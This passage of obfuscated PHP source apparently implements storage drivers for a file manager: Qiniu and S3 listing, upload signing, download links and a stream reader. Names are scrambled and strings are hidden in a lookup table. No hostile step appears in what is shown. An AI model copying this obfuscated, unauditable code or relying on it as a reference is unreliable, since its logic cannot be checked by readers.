$•¥ßÙ¦­ = trim($ ¨—À, $ÖİÎµßœ[8]) . $ÖİÎµßœ[8]; if (!empty($ ¨—À) && $ ¨—À !== $ÖİÎµßœ[212] && !in_array($•¥ßÙ¦­, $Öâü«™¢[$ÖİÎµßœ[82]])) { $Öâü«™¢[$ÖİÎµßœ[82]][] = $•¥ßÙ¦­; } $íìÉÄ“ = $this->delByBatch($Öâü«™¢[$ÖİÎµßœ[83]]); if (!$íìÉÄ“) { return !1; } $íìÉÄ“ = $this->delByBatch($Öâü«™¢[$ÖİÎµßœ[82]]); if (!$íìÉÄ“) { return !1; } return $this->delFile($•¥ßÙ¦­); } private function delByBatch($­¿Ó”Ö°) { foreach (array_chunk($­¿Ó”Ö°, 1000) as $óó¤…¸ã) { $Ú£Îô¡¶ = $this->bucketManager->buildBatchDelete($this->bucket, $óó¤…¸ã); list($¦ÜüµóÚ, $©À¨øßÍ) = $this->bucketManager->batch($Ú£Îô¡¶); if ($©À¨øßÍ) { return !1; } } return !0; } public function rename($”ïÃ£ò², $£Ë‡Œ–¦) { return $this->renameObject($”ïÃ£ò², $£Ë‡Œ–¦); } public function fileInfo($ŸêÚùè, $££®«ş = false, $üœğÉÖ = array()) { $ĞöÇƒä =& $_SERVER[Ö†ØøÖ±]; $°©±ô = array($ĞöÇƒä[32] => $this->pathThis($ŸêÚùè), $ĞöÇƒä[84] => $this->getPathOuter($ĞöÇƒä[8] . $ŸêÚùè), $ĞöÇƒä[33] => $ĞöÇƒä[214], $ĞöÇƒä[76] => isset($üœğÉÖ[$ĞöÇƒä[1465]]) ? $üœğÉÖ[$ĞöÇƒä[1465]] : 0, $ĞöÇƒä[175] => $this->ext($ŸêÚùè)); if ($££®«ş) { return $°©±ô; } $°©±ô[$ĞöÇƒä[215]] = $°©±ô[$ĞöÇƒä[85]] = 0; $°©±ô[$ĞöÇƒä[216]] = $°©±ô[$ĞöÇƒä[217]] = !0; if (empty($üœğÉÖ)) { $üœğÉÖ = $this->objectMeta($ŸêÚùè); if (!$üœğÉÖ) { return $°©±ô; } } if (isset($üœğÉÖ[$ĞöÇƒä[218]]) && $üœğÉÖ[$ĞöÇƒä[218]]) { $°©±ô[$ĞöÇƒä[219]] = $üœğÉÖ[$ĞöÇƒä[218]]; } if (isset($üœğÉÖ[$ĞöÇƒä[228]]) && $üœğÉÖ[$ĞöÇƒä[228]]) { $°©±ô[$ĞöÇƒä[219]] = $üœğÉÖ[$ĞöÇƒä[228]]; } if (isset($üœğÉÖ[$ĞöÇƒä[1466]])) { $°©±ô[$ĞöÇƒä[85]] = substr($üœğÉÖ[$ĞöÇƒä[1466]] . $ĞöÇƒä[12], 0, 10); } if (isset($üœğÉÖ[$ĞöÇƒä[1465]])) { $°©±ô[$ĞöÇƒä[76]] = $üœğÉÖ[$ĞöÇƒä[1465]]; } return $°©±ô; } public function folderInfo($”Ô—ÎÚÕ, $Ş¤Øéú¹ = false) { $èÀå¦íŒ =& $_SERVER[Ö†ØøÖ±]; $Ş­¯¸…Ï = array($èÀå¦íŒ[32] => $this->pathThis($”Ô—ÎÚÕ), $èÀå¦íŒ[84] => $this->getPathOuter($èÀå¦íŒ[8] . $”Ô—ÎÚÕ), $èÀå¦íŒ[33] => $èÀå¦íŒ[75]); if ($Ş¤Øéú¹) { return $Ş­¯¸…Ï; } $Ş­¯¸…Ï[$èÀå¦íŒ[215]] = $Ş­¯¸…Ï[$èÀå¦íŒ[85]] = 0; $Ş­¯¸…Ï[$èÀå¦íŒ[216]] = $Ş­¯¸…Ï[$èÀå¦íŒ[217]] = !0; $”Ô—ÎÚÕ = rtrim($”Ô—ÎÚÕ, $èÀå¦íŒ[8]) . $èÀå¦íŒ[8]; $ïƒ“ÉÇ = $this->objectMeta($”Ô—ÎÚÕ); if (isset($ïƒ“ÉÇ[$èÀå¦íŒ[1466]])) { $Ş­¯¸…Ï[$èÀå¦íŒ[85]] = substr($ïƒ“ÉÇ[$èÀå¦íŒ[1466]] . $èÀå¦íŒ[12], 0, 10); } return $Ş­¯¸…Ï; } public function listPath($”ùŠÌ‰, $ãÙàÂÓï = false) { $Æã¿‚“ =& $_SERVER[Ö†ØøÖ±]; $Ú¸ÄĞ–½ = $this->fileList($”ùŠÌ‰, $Æã¿‚“[8], !0); foreach ($Ú¸ÄĞ–½[$Æã¿‚“[82]] as $”æ¢¹Ø” => $½œ²ú³š) { $Ú¸ÄĞ–½[$Æã¿‚“[82]][$”æ¢¹Ø”] = $this->folderInfo($½œ²ú³š, $ãÙàÂÓï); } foreach ($Ú¸ÄĞ–½[$Æã¿‚“[83]] as $”æ¢¹Ø” => $½œ²ú³š) { $Ú¸ÄĞ–½[$Æã¿‚“[83]][$”æ¢¹Ø”] = $this->fileInfo($½œ²ú³š[$Æã¿‚“[94]], $ãÙàÂÓï, $½œ²ú³š); } return $Ú¸ÄĞ–½; } public function has($¥í˜³ôº, $’äƒì¬ı = false, $»ó“ñÀÂ = true) { $—ß§«‡ =& $_SERVER[Ö†ØøÖ±]; $¥í˜³ôº = trim($¥í˜³ôº, $—ß§«‡[8]); $Æİüüƒ = empty($¥í˜³ôº) && $¥í˜³ôº !== $—ß§«‡[212] ? $—ß§«‡[12] : $¥í˜³ôº . $—ß§«‡[8]; $Ëüó¾Å® = $—ß§«‡[12]; $÷é×˜ÓÄ = 500; $²Ñ½¡– = $—ß§«‡[8]; $’†çŠ‘è = $´ãëõÔì = 0; while (!0) { check_abort(); list($ìÌç¯Ì, $öÎÍº) = $this->bucketManager->listFiles($this->bucket, $Æİüüƒ, $Ëüó¾Å®, $÷é×˜ÓÄ, $²Ñ½¡–); if ($öÎÍº) { break; } $Ëüó¾Å® = array_key_exists($—ß§«‡[1434], $ìÌç¯Ì) ? $Ëüó¾Å® = $ìÌç¯Ì[$—ß§«‡[1467]] : $—ß§«‡[12]; if ($’äƒì¬ı) { if (!empty($ìÌç¯Ì[$—ß§«‡[1468]])) { $’†çŠ‘è += count($ìÌç¯Ì[$—ß§«‡[1468]]); } if (!empty($ìÌç¯Ì[$—ß§«‡[1469]])) { $´ãëõÔì += count($ìÌç¯Ì[$—ß§«‡[1469]]); } if ($Ëüó¾Å® === $—ß§«‡[12]) { break; } continue; } if ($»ó“ñÀÂ) { if (!empty($ìÌç¯Ì[$—ß§«‡[1468]])) { return !0; } } else { if (!empty($ìÌç¯Ì[$—ß§«‡[1469]])) { return !0; } } if ($Ëüó¾Å® === $—ß§«‡[12]) { break; } } if ($’äƒì¬ı) { return array($—ß§«‡[223] => $’†çŠ‘è, $—ß§«‡[224] => $´ãëõÔì); } return !1; } public function listAll($ÑÏÈ¸é) { $ÉÀÌÉ =& $_SERVER[Ö†ØøÖ±]; $ì˜¥œˆ = $this->fileList($ÑÏÈ¸é, $ÉÀÌÉ[12], !0); $æ¡Æ­šŞ = array_to_keyvalue($ì˜¥œˆ[$ÉÀÌÉ[83]], $ÉÀÌÉ[32]); foreach ($ì˜¥œˆ[$ÉÀÌÉ[82]] as $ß®¢™½•) { if (is_string($ß®¢™½•)) { $æ¡Æ­šŞ[$ß®¢™½•] = array($ÉÀÌÉ[76] => 0); } } return $this->listAllFiles($ÑÏÈ¸é, $æ¡Æ­šŞ); } private function fileList($ô•âªê„, $•¯Ä²¿¨ = '', $Äâ¶‚ĞÎ = 0) { $™ÉÕ¦ï =& $_SERVER[Ö†ØøÖ±]; $ô•âªê„ = trim($ô•âªê„, $™ÉÕ¦ï[8]); $„™ç¯¢ê = empty($ô•âªê„) && $ô•âªê„ !== $™ÉÕ¦ï[212] ? $™ÉÕ¦ï[12] : $ô•âªê„ . $™ÉÕ¦ï[8]; $™’šğè = $™ÉÕ¦ï[12]; $Œ»àùèä = 1000; $«•Î£Ñè = $¡‘âÍÕ = array(); while (!0) { check_abort(); list($š¯şùı, $ºğØşê¹) = $this->bucketManager->listFiles($this->bucket, $„™ç¯¢ê, $™’šğè, $Œ»àùèä, $•¯Ä²¿¨); if ($ºğØşê¹) { break; } $™’šğè = array_key_exists($™ÉÕ¦ï[1434], $š¯şùı) ? $™’šğè = $š¯şùı[$™ÉÕ¦ï[1467]] : $™ÉÕ¦ï[12]; $óÌº³ = isset($š¯şùı[$™ÉÕ¦ï[1468]]) ? $š¯şùı[$™ÉÕ¦ï[1468]] : array(); $¨¬ï–øº = isset($š¯şùı[$™ÉÕ¦ï[1469]]) ? $š¯şùı[$™ÉÕ¦ï[1469]] : array(); foreach ($óÌº³ as $ëÖß»¯õ) { if ($ëÖß»¯õ[$™ÉÕ¦ï[94]] == $„™ç¯¢ê) { continue; } $ÜˆÛ—†‚ = $ëÖß»¯õ[$™ÉÕ¦ï[94]]; $ášµÛÓŸ = $ëÖß»¯õ[$™ÉÕ¦ï[1465]]; $ëÖß»¯õ[$™ÉÕ¦ï[76]] = $ášµÛÓŸ; $ò·±® = $ášµÛÓŸ == 0 && substr($ÜˆÛ—†‚, strlen($ÜˆÛ—†‚) - 1, 1) == $™ÉÕ¦ï[8] ? !0 : !1; $this->cacheMethodInfoSet($ÜˆÛ—†‚, $ò·±®, $ëÖß»¯õ); if ($ò·±®) { $«•Î£Ñè[] = $ÜˆÛ—†‚; continue; } $¡‘âÍÕ[] = $Äâ¶‚ĞÎ ? $ëÖß»¯õ : $ÜˆÛ—†‚; } foreach ($¨¬ï–øº as $ÜˆÛ—†‚) { if ($ÜˆÛ—†‚ == $„™ç¯¢ê) { continue; } $«•Î£Ñè[] = $ÜˆÛ—†‚; $this->cacheMethodInfoSet($ÜˆÛ—†‚, !0); } if ($™’šğè === $™ÉÕ¦ï[12]) { break; } } $this->cacheMethodInfoSet($ô•âªê„, !0); return array($™ÉÕ¦ï[82] => $«•Î£Ñè, $™ÉÕ¦ï[83] => $¡‘âÍÕ); } public function canRead($çÎñÏÛ) { return $this->exist($çÎñÏÛ) ? !0 : !1; } public function canWrite($ñÏ…¥š) { return $this->exist($ñÏ…¥š) ? !0 : !1; } public function getContent($˜¤ñö—) { return $this->fileSubstr($˜¤ñö—, 0, -1); } public function setContent($Ê‡ß¹ÈØ, $éÏÓĞç» = '') { $Õ•êñœÔ = $this->tempFile($this->pathThis($Ê‡ß¹ÈØ)); file_put_contents($Õ•êñœÔ, $éÏÓĞç»); if ($this->upload($Ê‡ß¹ÈØ, $Õ•êñœÔ)) { $this->tempFileRemve($Õ•êñœÔ); return !0; } return !1; } public function refreshUrls($Ãø•¹) { $Ñ¨şÖÌØ =& $_SERVER[Ö†ØøÖ±]; $áÎ…˜ˆ = array(); if (is_array($Ãø•¹)) { foreach ($Ãø•¹ as $á¬Ãºªò) { $áÎ…˜ˆ[] = $this->link($á¬Ãºªò); } } else { $áÎ…˜ˆ[] = $this->link($Ãø•¹); } $œ§âêöó = new Qiniu\Cdn\CdnManager($this->auth); list($şşûÏÚÀ, $—ÒÃª¶ô) = $œ§âêöó->refreshUrls($áÎ…˜ˆ); if ($—ÒÃª¶ô) { return !1; } return $şşûÏÚÀ[$Ñ¨şÖÌØ[1235]] == $Ñ¨şÖÌØ[812] ? !0 : !1; } public function fileSubstr($ÉÌ‰Ú¢á, $³©øÔÅ, $É¦È€İÕ) { $îÄ³´íÄ =& $_SERVER[Ö†ØøÖ±]; if (!($©æÚÃÍİ = $this->link($ÉÌ‰Ú¢á))) { return !1; } $ÓŠ¢ç° = !1; if ($É¦È€İÕ > 0) { $—ØÛŸ‡ = $³©øÔÅ + $É¦È€İÕ - 1; $ÓŠ¢ç° = array($îÄ³´íÄ[1470] . $³©øÔÅ . $îÄ³´íÄ[438] . $—ØÛŸ‡); } $¢ò›­¥š = url_request($©æÚÃÍİ, $îÄ³´íÄ[245], !1, $ÓŠ¢ç°); return $¢ò›­¥š[$îÄ³´íÄ[803]] ? $¢ò›­¥š[$îÄ³´íÄ[1255]] : !1; } public function upload($÷”Ü†Á±, $©¢ØÉ–ş, $ĞèÄö¶Ë = false, $ä¥±²Ô¨ = REPEAT_REPLACE) { $…ºğŠ¹ô = new Qiniu\Storage\UploadManager(); $ŸÑÈ”¦ò = $this->auth->uploadToken($this->bucket, $÷”Ü†Á±); $½Öªì¡¯ = get_file_mime(get_path_ext($©¢ØÉ–ş)); list($Äàœö‰À, $úşäïÍ†) = $…ºğŠ¹ô->putFile($ŸÑÈ”¦ò, $÷”Ü†Á±, $©¢ØÉ–ş, null, $½Öªì¡¯); return $úşäïÍ† ? !1 : $this->getPathOuter($÷”Ü†Á±); } public function uploadFormData($Ş¿´˜á«, $Ä†¬õ‹Î = 3600) { return $this->uploadToken($Ş¿´˜á«, $Ä†¬õ‹Î); } public function multiUploadFormData($éàŒñ…ö, $ÓßÊ¥ö = 3600) { return $this->uploadToken($éàŒñ…ö, $ÓßÊ¥ö); } private function uploadToken($–¤©Ú·â, $ª¹Ä´ı = 3600) { $£¢œ‘ =& $_SERVER[Ö†ØøÖ±]; $–¯ïßÙ = $ª¹Ä´ı; $ßŞ ÎÑË = array($£¢œ‘[1471] => $£¢œ‘[1472]); $—‘éüıÓ = $–¤©Ú·â; $Êæ÷‚¿ = $this->auth->uploadToken($this->bucket, $—‘éüıÓ, $–¯ïßÙ, $ßŞ ÎÑË, !0); $€öäÏ™æ = empty($this->region) || $this->region == $£¢œ‘[1473] ? $£¢œ‘[12] : $£¢œ‘[438] . $this->region; $‰‘™˜ñÊ = http_type() . "\72\57\x2f\165\160\154\157\x61\x64{$€öäÏ™æ}\56\x71\x69\x6e\x69\x75\160\x2e\x63\x6f\x6d\x2f"; return array($£¢œ‘[1474] => $Êæ÷‚¿, $£¢œ‘[1475] => $‰‘™˜ñÊ); } public function download($¡ãÂ¬÷Ø, $ºÙâÓûö) { $øîÏ†›  = IO::getPathInner(IO::mkfile($ºÙâÓûö)); if (!($í·ÆÙ”¦ = $this->link($¡ãÂ¬÷Ø))) { return !1; } $‰­šÀ­Ô = 0; $úÌÃŠû = 1024 * 200; $É‹²÷ü¤ = fopen($øîÏ†› , $_SERVER[Ö†ØøÖ±][1476]); while (!0) { $˜¡Ïó–é = $this->fileSubstr($¡ãÂ¬÷Ø, $‰­šÀ­Ô, $úÌÃŠû); if ($˜¡Ïó–é === !1) { return !1; } fwrite($É‹²÷ü¤, $˜¡Ïó–é); $‰­šÀ­Ô += $úÌÃŠû; if (strlen($˜¡Ïó–é) < $úÌÃŠû) { break; } } fclose($É‹²÷ü¤); return $ºÙâÓûö; } public function link($ê¼‹—², $ÂşÜòõ = '') { if (!$this->isFile($ê¼‹—²)) { return !1; } $¯ÈıÎ¾ = $this->getHost() . $_SERVER[Ö†ØøÖ±][8] . $this->pathEncode($ê¼‹—²) . $ÂşÜòõ; return $this->auth->privateDownloadUrl($¯ÈıÎ¾, 3600 * 12); } public function fileOut($À¬ã¦£¸, $ÓÎ™…´ = false, $ÑÙßÔº­ = false, $Ê±ñåş = '') { $•åî™‹£ =& $_SERVER[Ö†ØøÖ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($À¬ã¦£¸, $ÓÎ™…´, $ÑÙßÔº­, $Ê±ñåş); } if (!$ÑÙßÔº­) { $ÑÙßÔº­ = $this->pathThis($À¬ã¦£¸); } $›¯Íõ€ã = $ÓÎ™…´ ? $•åî™‹£[1477] . rawurlencode($ÑÙßÔº­) : $•åî™‹£[12]; $ŒÅ˜ç… = $this->link($À¬ã¦£¸, $›¯Íõ€ã); $this->fileOutLink($ŒÅ˜ç…); } public function fileOutServer($ÕÇâæÜŒ, $òœ®ª«ó = false, $Â›·ã³ = false, $²Œ“Óî¿ = '') { parent::fileOut($ÕÇâæÜŒ, $òœ®ª«ó, $Â›·ã³, $²Œ“Óî¿); } public function fileOutImage($…£³öÅ, $£¨™‡ºÛ = 250) { $î€¡êí = $this->link($…£³öÅ, $_SERVER[Ö†ØøÖ±][1478] . $£¨™‡ºÛ); $this->fileOutLink($î€¡êí); } public function fileOutImageServer($™×”Ë ä, $İÒ–‰í¦ = 250) { parent::fileOutImage($™×”Ë ä, $İÒ–‰í¦); } public function hashMd5($¡ÕÛ) { $•óÔÛäò =& $_SERVER[Ö†ØøÖ±]; $ĞùÈÅÌ· = $this->objectMeta($¡ÕÛ); return isset($ĞùÈÅÌ·[$•óÔÛäò[228]]) ? $ĞùÈÅÌ·[$•óÔÛäò[228]] : !1; $û—ïÎ§ = $this->link($¡ÕÛ, $•óÔÛäò[1479]); } public function size($ÄĞíÎ´å) { $Š…Ûàø = $this->objectMeta($ÄĞíÎ´å); return $Š…Ûàø ? $Š…Ûàø[$_SERVER[Ö†ØøÖ±][76]] : 0; } public function info($ŒšñàÀú) { if ($this->isFolder($ŒšñàÀú)) { return $this->folderInfo($ŒšñàÀú); } else { if ($this->isFile($ŒšñàÀú)) { return $this->fileInfo($ŒšñàÀú); } } return !1; } public function exist($ÅÎ›€Û’) { return $this->isFile($ÅÎ›€Û’) || $this->isFolder($ÅÎ›€Û’); } public function isFile($“Ù×á¬¶) { return !$this->isFolder($“Ù×á¬¶) && $this->objectMeta($“Ù×á¬¶); } public function isFolder($›Çœ“–«) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][166], $›Çœ“–«); } protected function objectMeta($ö°õ¨ôØ) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][168], $ö°õ¨ôØ); } protected function _objectMeta($›ğ¨×Ÿç) { $é„ÕŠä® =& $_SERVER[Ö†ØøÖ±]; list($À¹›Ğ ø, $šÈ’Ô…) = $this->bucketManager->stat($this->bucket, $›ğ¨×Ÿç); if ($À¹›Ğ ø) { $À¹›Ğ ø[$é„ÕŠä®[76]] = intval($À¹›Ğ ø[$é„ÕŠä®[1465]]); } return $À¹›Ğ ø; } protected function _isFolder($’†Œ˜„) { $ĞáÍªï =& $_SERVER[Ö†ØøÖ±]; if ($’†Œ˜„ == $ĞáÍªï[12] || $’†Œ˜„ == $ĞáÍªï[8]) { return !0; } list($í¦í°÷Š, $Õ©÷Ÿ´Ü) = $this->bucketManager->listFiles($this->bucket, trim($’†Œ˜„, $ĞáÍªï[8]) . $ĞáÍªï[8], $ĞáÍªï[12], 1, $ĞáÍªï[8]); return !empty($í¦í°÷Š[$ĞáÍªï[1468]]) || !empty($í¦í°÷Š[$ĞáÍªï[1469]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ì´‹ÊÊÉ) { parent::__construct($ì´‹ÊÊÉ); } public function uploadFormData($½Ç¢Æ©Æ, $£¬€»Øë = 3600) { $ö Í¾¼µ =& $_SERVER[Ö†ØøÖ±]; $¯´•ÓÓ = $ö Í¾¼µ[213]; $›¢ÎÕÜ = $ö Í¾¼µ[253]; $Ÿ–Ó²åô = $ö Í¾¼µ[62]; $çìúƒêÒ = gmdate($ö Í¾¼µ[254]); $€Ãß®ÈŸ = gmdate($ö Í¾¼µ[255]); $³Å´ÎœŒ = $ö Í¾¼µ[256]; $›¥‰ÃäÙ = $£¬€»Øë . $ö Í¾¼µ[12]; $•¾äö®Á = $ö Í¾¼µ[257]; $¾À†è•„ = array($this->accessKey, $€Ãß®ÈŸ, $this->region, $Ÿ–Ó²åô, $³Å´ÎœŒ); $·öÀ£•ö = implode($ö Í¾¼µ[8], $¾À†è•„); $’ä…è¥ = array($ö Í¾¼µ[258] => gmdate($ö Í¾¼µ[1377], strtotime($ö Í¾¼µ[260])), $ö Í¾¼µ[261] => array(array($ö Í¾¼µ[262] => $this->bucket), array($ö Í¾¼µ[263] => $¯´•ÓÓ), array($ö Í¾¼µ[264], $ö Í¾¼µ[265], $ö Í¾¼µ[12]), array($ö Í¾¼µ[264], $ö Í¾¼µ[266], $ö Í¾¼µ[12]), array($ö Í¾¼µ[264], $ö Í¾¼µ[267], $ö Í¾¼µ[12]), array($ö Í¾¼µ[268] => $•¾äö®Á), array($ö Í¾¼µ[269] => $·öÀ£•ö), array($ö Í¾¼µ[270] => $›¢ÎÕÜ), array($ö Í¾¼µ[271] => $çìúƒêÒ), array($ö Í¾¼µ[272] => $›¥‰ÃäÙ))); $‹÷áşÊ‡ = base64_encode(json_encode($’ä…è¥)); $ÑÁ†¬“ = hash_hmac($ö Í¾¼µ[273], $€Ãß®ÈŸ, $ö Í¾¼µ[274] . $this->secret, !0); $¹ÏŞø² = hash_hmac($ö Í¾¼µ[273], $this->region, $ÑÁ†¬“, !0); $İ†©Šæ… = hash_hmac($ö Í¾¼µ[273], $Ÿ–Ó²åô, $¹ÏŞø², !0); $›•÷½¢ = hash_hmac($ö Í¾¼µ[273], $³Å´ÎœŒ, $İ†©Šæ…, !0); $ÚŞåì·è = hash_hmac($ö Í¾¼µ[273], $‹÷áşÊ‡, $›•÷½¢); $‚• ä¢— = array($ö Í¾¼µ[230] => $ö Í¾¼µ[12], $ö Í¾¼µ[275] => $ö Í¾¼µ[12], $ö Í¾¼µ[263] => $¯´•ÓÓ, $ö Í¾¼µ[268] => $•¾äö®Á, $ö Í¾¼µ[276] => $‹÷áşÊ‡, $ö Í¾¼µ[277] => $·öÀ£•ö, $ö Í¾¼µ[278] => $›¢ÎÕÜ, $ö Í¾¼µ[279] => $çìúƒêÒ, $ö Í¾¼µ[280] => $›¥‰ÃäÙ, $ö Í¾¼µ[281] => $ÚŞåì·è, $ö Í¾¼µ[196] => $this->getHost()); return $‚• ä¢—; } public function multiUploadFormData($ÍØ¤¥ÂÁ, $÷äëÕÕ© = 3600) { $ß™ÉÙå€ =& $_SERVER[Ö†ØøÖ±]; $Â÷¿’Üë = gmdate($ß™ÉÙå€[1480]); $î¯èÍŠø = array(); $çıœÑøü = $this->client->getUploadId($this->bucket, $ÍØ¤¥ÂÁ, $î¯èÍŠø); if (!$çıœÑøü) { return !1; } return array($ß™ÉÙå€[238] => $çıœÑøü, $ß™ÉÙå€[196] => $this->getHost() . $ß™ÉÙå€[8] . $this->pathEncode($ÍØ¤¥ÂÁ), $ß™ÉÙå€[239] => $Â÷¿’Üë, $ß™ÉÙå€[94] => $ÍØ¤¥ÂÁ); } public function multiUploadAuthData($ÁÊ™Î½‘, $ÍÁ™é² = array()) { $µ¡»áêÏ =& $_SERVER[Ö†ØøÖ±]; $Ï¤úë¾¼ = isset($ÍÁ™é²[$µ¡»áêÏ[175]]) ? $ÍÁ™é²[$µ¡»áêÏ[175]] : $µ¡»áêÏ[12]; $£‚ÈõÌ¤ = $ÍÁ™é²[$µ¡»áêÏ[94]]; unset($ÍÁ™é²[$µ¡»áêÏ[94]]); if (isset($ÍÁ™é²[$µ¡»áêÏ[240]])) { return $this->listUploadParts($£‚ÈõÌ¤, $ÍÁ™é²); } $øí¯ˆú¼ = array(); if (isset($ÍÁ™é²[$µ¡»áêÏ[1481]])) { $øí¯ˆú¼[$µ¡»áêÏ[1482]] = $ÍÁ™é²[$µ¡»áêÏ[1481]]; } $’ºçÑáİ = explode($µ¡»áêÏ[198], $this->getHost()); $ˆ Í³ÍË = array($µ¡»áêÏ[1483] => $’ºçÑáİ[1], $µ¡»áêÏ[1484] => $µ¡»áêÏ[12], $µ¡»áêÏ[230] => $µ¡»áêÏ[120], $µ¡»áêÏ[275] => $ÍÁ™é²[$µ¡»áêÏ[76]]); $ğ¬ø¹ÑÍ = $µ¡»áêÏ[243]; $œ¦ßˆ§ç = $µ¡»áêÏ[8] . $this->pathEncode($£‚ÈõÌ¤) . $Ï¤úë¾¼; $Óì–àê¬ = $this->client->__getSignatureV4($øí¯ˆú¼, $ˆ Í³ÍË, $ğ¬ø¹ÑÍ, $œ¦ßˆ§ç); if (strpos($Ï¤úë¾¼, $µ¡»áêÏ[242]) === 0) { if (isset($øí¯ˆú¼[$µ¡»áêÏ[1482]])) { $›¯€ñŞ— = $øí¯ˆú¼[$µ¡»áêÏ[1482]]; } else { if (isset($Óì–àê¬[$µ¡»áêÏ[1482]])) { $›¯€ñŞ— = $Óì–àê¬[$µ¡»áêÏ[1482]]; } else { $›¯€ñŞ— = hash($µ¡»áêÏ[273], $µ¡»áêÏ[12]); } } return array($µ¡»áêÏ[249] => $Óì–àê¬[$µ¡»áêÏ[249]], $µ¡»áêÏ[1482] => $›¯€ñŞ—, $µ¡»áêÏ[239] => $Óì–àê¬[$µ¡»áêÏ[1485]]); } return $Óì–àê¬[$µ¡»áêÏ[249]]; } public function listUploadParts($§ß¬Ó£Ÿ, $Ô”¶½²¬ = array()) { $úÇºš—¨ =& $_SERVER[Ö†ØøÖ±]; $Ï§£×“è = str_replace($úÇºš—¨[250], $úÇºš—¨[12], $Ô”¶½²¬[$úÇºš—¨[175]]); $ÀµîàÕ­ = $this->client->listParts($this->bucket, $§ß¬Ó£Ÿ, $Ï§£×“è); if (!$ÀµîàÕ­) { return !1; } $™œ¤ô¥ = $úÇºš—¨[1486]; foreach ($ÀµîàÕ­ as $ëÅ·êö×) { $™œ¤ô¥ .= $úÇºš—¨[1487] . "\x3c\120\141\162\164\116\x75\155\x62\145\162\x3e{$ëÅ·êö×[$úÇºš—¨[1442]]}\x3c\57\x50\141\162\x74\116\165\155\142\145\162\76\xa" . "\74\105\124\x61\147\x3e{$ëÅ·êö×[$úÇºš—¨[1443]]}\x3c\57\105\124\x61\x67\x3e\xa" . $úÇºš—¨[1488]; } $™œ¤ô¥ .= $úÇºš—¨[1489]; $ ¤„šù¥ = array(); $¯‰ÑÎÎÀ = explode($úÇºš—¨[198], $this->getHost()); $ùø¡†”û = array($úÇºš—¨[1483] => $¯‰ÑÎÎÀ[1], $úÇºš—¨[230] => $úÇºš—¨[120], $úÇºš—¨[275] => strlen($™œ¤ô¥)); $Ó¾–©×ó = $úÇºš—¨[241]; $éı´ÌÔ = $úÇºš—¨[8] . $this->pathEncode($§ß¬Ó£Ÿ) . $Ô”¶½²¬[$úÇºš—¨[175]]; $‹ÏÃ×² = $this->client->__getSignatureV4($ ¤„šù¥, $ùø¡†”û, $Ó¾–©×ó, $éı´ÌÔ, $™œ¤ô¥); return array($úÇºš—¨[249] => $‹ÏÃ×²[$úÇºš—¨[249]], $úÇºš—¨[239] => $‹ÏÃ×²[$úÇºš—¨[1485]], $úÇºš—¨[251] => $ÀµîàÕ­, $úÇºš—¨[1482] => $‹ÏÃ×²[$úÇºš—¨[1482]]); } public function link($ı»ÌÇ•‰, $·½¢ƒ„ = array()) { return parent::link($ı»ÌÇ•‰, $·½¢ƒ„); } public function fileOut($ÅµÃá¶¥, $Êƒ´ÖôÖ = false, $ú¤Ë«Ûï = false, $ÀÂÓ‹î¼ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ö†ØøÖ±][1490])) { return parent::fileOutServer($ÅµÃá¶¥, $Êƒ´ÖôÖ, $ú¤Ë«Ûï, $ÀÂÓ‹î¼); } parent::fileOut($ÅµÃá¶¥, $Êƒ´ÖôÖ, $ú¤Ë«Ûï, $ÀÂÓ‹î¼); } public function fileOutImage($Òç £©, $º·‡‡³ = 250) { if (strstr($this->endpoint, $_SERVER[Ö†ØøÖ±][1490])) { return parent::fileOutImageServer($Òç £©, $º·‡‡³); } parent::fileOutImage($Òç £©, $º·‡‡³); } public function fileOutLink($°˜½Ÿïå) { $³à„‡ì… =& $_SERVER[Ö†ØøÖ±]; if (substr($°˜½Ÿïå, 0, 7) == $³à„‡ì…[1383]) { $°˜½Ÿïå = $³à„‡ì…[1384] . substr($°˜½Ÿïå, 7); } header($³à„‡ì…[162] . $°˜½Ÿïå); die; } public function getHost() { $•û¢éè¦ =& $_SERVER[Ö†ØøÖ±]; $…á—ËÜ§ = str_rtrim(parent::getHost(), $•û¢éè¦[8] . $this->bucket); $…á—ËÜ§ = explode($•û¢éè¦[198], $…á—ËÜ§); return $…á—ËÜ§[0] . $•û¢éè¦[198] . $this->bucket . $•û¢éè¦[10] . $…á—ËÜ§[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($…µÖíš, $ÖÑõ¨£ë = 0) { parent::__construct(); $this->source = $…µÖíš; $this->sourceSize = $ÖÑõ¨£ë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÒíÀï™ˆ = false) { return $this->sourceSize; } public function getContent($°‡ï¶¼ì = false) { return $this->fileSubstr($°‡ï¶¼ì, 0, $this->sourceSize); } public function fileSubstr($á–¬Ş× = false, $§ôïØÍ± = 0, $Û‚¿úéª = 0) { if (!$Û‚¿úéª) { $Û‚¿úéª = $this->sourceSize; } $™ËÌ¼×ã = $this->sourceSize - $§ôïØÍ±; if ($Û‚¿úéª >= $™ËÌ¼×ã) { $Û‚¿úéª = $™ËÌ¼×ã; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§ôïØÍ±, $Û‚¿úéª); } if ($this->sourceType == self::TYPE_FILE) { if ($Û‚¿úéª <= 0) { return $_SERVER[Ö†ØøÖ±][12]; } $ÕüÉÖµ° = ftell($this->source); fseek_64($this->source, $ÕüÉÖµ° + $§ôïØÍ±); $©’ü¸³¦ = @fread($this->source, $Û‚¿úéª); fseek_64($this->source, $ÕüÉÖµ°); return $©’ü¸³¦; } } public function hashMd5($«Ê®Ï°ˆ = false) { return md5($this->getContent()); } public static function hash($Ô¯¹ã£×, $¸ßüçƒÏ = 0) { $Ô½ÜÂÈ = new PathDriverStream($Ô¯¹ã£×, $¸ßüçƒÏ); return $Ô½ÜÂÈ->hashSimple($Ô¯¹ã£×); } public static function md5($ö”‰÷, $ğûéèÌê = 0) { $³–ŠÊ½¤ = new PathDriverStream($ö”‰÷, $ğûéèÌê); return $³–ŠÊ½¤->hashMd5($ö”‰÷); } } goto Cé†¦Ÿ“‹Š; C‰«÷á”¾°: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($æ§Ü‘¨´, $×Üò‡®È) { $äéä‹‡˜ =& 